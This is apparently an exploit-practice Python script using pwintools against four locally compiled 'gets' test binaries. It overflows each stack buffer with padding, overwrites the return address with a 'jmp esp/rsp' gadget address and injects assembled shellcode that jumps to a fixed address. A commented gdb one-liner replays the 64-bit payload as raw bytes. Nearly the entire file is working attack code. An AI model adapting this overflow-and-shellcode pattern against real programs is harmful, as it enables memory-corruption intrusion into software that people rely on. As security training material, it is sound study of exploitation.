# 3rd exploit: buffer overflow + jump to stack

from pwintools import *

processes = [
	Process('1_gets_gcc_32.exe'),
	Process('1_gets_gcc_64.exe'),
	Process('1_gets_vs_32.exe'),
	Process('1_gets_vs_64.exe'),
]

offsets = [
	48,
	56,
	40,
	56,
]

# better way?
packer = [
	p32,
	p64,
	p32,
	p64,
]

# jmp *sp
jumpTargets = [
	0x40171f,
	0x40168e,
	0x4070BA,
	0x14000703F,
]

data = [
	0x401612,
	0x40159c,
	0x406FF3,
	0x14000707F,
]

injections = [
	asm('mov eax, ' + str(data[0]) + '; jmp eax', 32),
	asm('mov rax, ' + str(data[1]) + '; jmp rax', 64), # stack is not executable in 64 bits
	asm('mov eax, ' + str(data[2]) + '; jmp eax', 32),
	asm('mov rax, ' + str(data[3]) + '; jmp rax', 64), # stack is not executable in 64 bits
]

#for p in processes:
#for i in range(1):
for i in range(len(processes)):
	processes[i].recvuntil(b'name:\r\n')
	print(b'Injecting ' + injections[i])
	processes[i].sendline(b'a'*offsets[i] + packer[i](jumpTargets[i]) + injections[i])
	print(processes[i].recvall())

"""
(echo b *0x40167d && echo r && python -c "import os; os.write(1, b'a'*56 + b'\x6f\x16\x40\x00\x00\x00\x00\x00' + b'\x90\xcc\x48\xb8\x60\x16\x40\x00\x00\x00\x00\x00' + b'\xff\xe0' + b'\x0d\x0a')" && echo disas $pc,+1 && echo stepi && echo disas $pc,+1 && echo print *(int**^^^)$rsp && echo stepi && echo disas $pc,+1 && echo c) | gdb 1_gets_gcc_64.exe
"""